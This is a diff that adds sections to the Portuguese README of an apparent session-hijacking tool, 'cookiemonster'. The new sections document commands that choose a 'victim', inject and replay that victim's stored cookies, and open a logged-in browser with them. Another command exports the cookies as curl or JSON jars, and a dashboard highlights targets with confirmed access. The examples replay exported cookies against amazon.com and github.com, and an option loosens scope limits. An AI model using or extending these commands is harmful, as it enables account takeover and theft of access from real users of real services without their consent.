@@ -752,6 +752,81 @@ python -m cookiemonster edit --db PATH --victim ID --domain TEXT --cookie NAME -
 python -m cookiemonster report --db PATH --out DIRECTORY
 ```
 
+### 8.11 `probe` (pipeline unificado)
+
+```
+python -m cookiemonster probe [OPTIONS]
+
+  --db PATH                    [default: store.db]
+  --domain TEXT                Dominio alvo (obrigatorio)
+  --scheme [https|http]        [default: https]
+  --path TEXT                  [default: /]
+  --url TEXT                   URL alvo (padrao: scheme://host/path)
+  --channel [playwright|httpx] [default: playwright]
+  --max-wait-ms INTEGER        [default: 8000]
+  --replay-mode [...]          [default: strict]
+  --allow-unsafe-scope
+```
+
+Faz best + cookies + inject + check em um unico comando com saida amigavel mostrando vitima escolhida, artefatos auth, replay e estado final.
+
+### 8.12 `access` (abrir navegador)
+
+```
+python -m cookiemonster access [OPTIONS]
+
+  --db PATH
+  --domain TEXT
+  --victim INTEGER
+  --url TEXT
+  --scheme [https|http]        [default: https]
+  --path TEXT                  [default: /]
+  --replay-mode [...]          [default: strict]
+  --max-wait-ms INTEGER        [default: 10000]
+  --wait-enter/--no-wait-enter [default: wait-enter]
+  --allow-unsafe-scope
+```
+
+Abre o navegador (headed) com os cookies injetados. Aguarda ENTER para fechar (ou use --no-wait-enter para fechar automaticamente).
+
+### 8.13 `export-cookies` (cookie jar)
+
+```
+python -m cookiemonster export-cookies [OPTIONS]
+
+  --db PATH
+  --domain TEXT
+  --victim INTEGER
+  --scheme [https|http]        [default: https]
+  --path TEXT                  [default: /]
+  -o, --output PATH
+  --format [netscape|json]     [default: netscape]
+  --include-anon               Inclui anonimos (default: so auth)
+```
+
+Exporta os cookies aplicaveis ao alvo no formato Netscape/curl (ou JSON). Apenas cookies que passam o matcher RFC 6265 sao incluidos.
+
+Exemplo de uso:
+```bash
+# Netscape/curl
+python -m cookiemonster export-cookies --domain amazon.com -o amazon.txt
+curl -b amazon.txt https://www.amazon.com/ap/signin
+
+# JSON (extensao de navegador)
+python -m cookiemonster export-cookies --domain github.com --format json -o github.json
+```
+
+### 8.14 `dashboard` (resumo amigavel)
+
+```
+python -m cookiemonster dashboard [OPTIONS]
+
+  --db PATH                    [default: store.db]
+  --limit INTEGER              [default: 10]
+```
+
+Mostra um resumo amigavel de todos os runs: contagem por estado (CONFIRMED/LIKELY/ANONYMOUS/UNKNOWN), ultimos N runs, e destaque dos alvos com acesso confirmado (com comando para replicar).
+
 ---
 
 ## 9. Estrutura do Projeto
